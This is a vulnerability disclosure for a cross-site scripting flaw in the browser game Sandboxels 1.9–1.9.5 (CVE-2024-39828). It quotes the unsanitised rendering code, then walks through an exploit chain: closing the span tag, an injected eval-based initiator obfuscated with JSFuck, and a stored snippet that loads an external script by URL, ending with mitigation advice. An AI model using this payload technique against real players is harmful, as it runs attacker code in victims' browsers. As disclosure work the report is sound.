# Cross-site scripting vulnerability for Sandboxels 1.9 - 1.9.5 ([CVE-2024-39828](https://nvd.nist.gov/vuln/detail/CVE-2024-39828))
This report details a cross-site scripting (XSS) vulnerability in Sandboxels (https://sandboxels.r74n.com/) affecting versions 1.9 to 1.9.5. The vulnerability can be exploited without requiring any game modifications.

## Vulnerability Overview
Sandboxels has a feature that lets some elements clone other pixels. Each cloning element (referred to as a "cloner") starts cloning the first pixel it touches. That pixel's element is displayed below the game canvas when hovering over the cloner.

## Exploit Details
Since version 1.9 which adds saves that can be manipulated in external programs and version 1.9.1 which adds a Prop tool, that property can be exploited to display arbitrary message below the game canvas. Since elements aren't verified or sanitized, that field can be exploited to execute JavaScript code (XSS):
```js
if (elements[currentPixel.element].hoverStat) {
    stats += "<span id='stat-hover' class='stat'>"+elements[currentPixel.element].hoverStat(currentPixel)+"</span>";
}
else if (currentPixel.clone) {
    stats += "<span id='stat-clone' class='stat'>"+currentPixel.clone.toUpperCase()+"</span>";
}
```
The uppercase value of the `clone` property is appended to the HTML code inside of `stats` div without any validation.

## Proof of concept
To manipulate the `clone` property of a pixel, the Prop tool is utilized. This tool allows players to change the properties of a pixel to any data without modifying the save file.

1. The attacker escapes the `<span>` tag using a `</span>` closing tag
2. The attacker injects JavaScript code using a known vulnerability, such as `<style onload=''></style>`. The injected code will function as an initiator: `eval(document.getElementById("1").innerHTML.toLowerCase())`
This code will turn any code found inside of an element with id of 1 into lowercase and run it.
Since the initiator code can't contain lowercase letters, a tool like [JSFuck](https://jsfuck.com/) should be used to remove such characters.
3. The attacker uses a `<p>` (or any other text-based tag) with an id of 1 to store the rest of the code. This code will be used to load an external script: `let a=document['createElement']('script');a.src='URL';document.head.append(a)`. Since this code will be turned into lowercase, it can't contain any uppercase characters, so a tool like JSFuck should be used to change any code that might contain such characters (such as 'createElement' in this case). That also mean that the URL can't contain such characters either.

### Steps to reproduce
1. Select the Prop tool in Sandboxels
2. Paste the code from `initiator.js` into browser's console
3. Use the Prop tool on some pixels
4. Hover over those pixels
5. Code from `test.js` should be executed

## Mitigation Recommendations
To prevents this XSS vulnerability, the following measures should be implemented:
* **Input Validation and Sanitization**: All inputs should be properly validated and sanitized, especially if they affect HTML content
* **Escape Output**: Any user-generated content should be escaped before inserting it into the DOM

By addressing these issues, the security of Sandboxels can be significantly improved, protecting users from potential XSS attacks.
